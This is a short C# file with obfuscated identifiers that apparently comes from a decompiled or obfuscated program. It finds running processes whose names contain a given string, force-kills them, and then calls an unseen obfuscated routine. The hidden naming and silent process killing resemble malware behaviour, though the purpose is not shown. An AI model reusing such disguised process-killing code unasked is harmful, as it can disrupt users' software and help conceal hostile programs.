using System;
using System.Diagnostics;

namespace UvfJgsTEpPeNG;

public sealed class EZeyrythhTGZvda
{
	public static bool lZCkmLRmLRErI(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void uKTDZDWOIBzD(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (lZCkmLRmLRErI(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					PHGJAOmKtxaSj.GpwvqylfmscwA();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
